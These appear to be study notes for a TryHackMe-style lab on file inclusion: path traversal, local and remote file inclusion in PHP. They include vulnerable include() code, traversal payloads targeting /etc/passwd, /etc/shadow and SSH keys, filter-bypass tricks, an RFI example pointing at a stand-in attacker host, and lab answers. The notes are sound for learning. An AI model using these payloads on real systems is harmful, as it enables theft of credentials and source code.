File Inclusion (LFI, RFI & Path Traversal)
📌 Overview

File Inclusion vulnerabilities occur when a web application allows user input to control file paths without proper validation.

These vulnerabilities include:

Path Traversal (Directory Traversal)

Local File Inclusion (LFI)

Remote File Inclusion (RFI)

If exploited successfully, attackers can:

Read sensitive files

Leak credentials

Access source code

Gain Remote Command Execution (RCE)

🧠 Why File Inclusion Happens

Main Cause:

❌ Poor input validation
❌ Trusting user-controlled parameters
❌ Unsafe PHP functions like:

include()

require()

file_get_contents()

Example vulnerable code:

include($_GET["file"]);

1️⃣ Path Traversal (Directory Traversal)
What is it?

Path traversal allows attackers to access files outside the web root directory using:

../


Example attack:

/get.php?file=../../../../etc/passwd


Each ../ moves one directory up.

🔥 PHP Function Causing It:
file_get_contents()

Common Sensitive Files (Linux)
/etc/passwd
/etc/shadow
/root/.ssh/id_rsa
/var/log/apache2/access.log
/proc/version

🧪 Lab #1 Payload
/lab1.php?file=/etc/passwd

2️⃣ Local File Inclusion (LFI)

LFI occurs when a local file is included inside the application.

Example vulnerable code:

include("languages/" . $_GET['lang']);


Attack:

?lang=../../../../etc/passwd

🧪 Lab #2

Directory inside include function:

includes

3️⃣ LFI Filter Bypass Techniques
🔹 Null Byte Injection (%00)

Used to terminate forced extensions.

Example:

../../../../etc/passwd%00


⚠️ Works only in PHP < 5.3.4

🔹 Current Directory Trick
/etc/passwd/.


or

/etc/passwd/..

🔹 Filter Bypass Using Double Encoding

If ../ is filtered:

Use:

....//....//....//etc/passwd

🧪 Lab #3 Payload
/lab3.php?file=../../../../etc/passwd

🧪 Lab #4 Function Causing Issue
file_get_contents

🧪 Lab #6 Required Directory
THM-profile

🧪 /etc/os-release VERSION_ID
12.04

4️⃣ Remote File Inclusion (RFI)

RFI allows inclusion of remote files hosted on another server.

Requires:

allow_url_fopen = On


Example:

?lang=http://attacker.thm/cmd.txt


Attacker's file:

<?php echo "Hello THM"; ?>


If vulnerable → code executes on server.

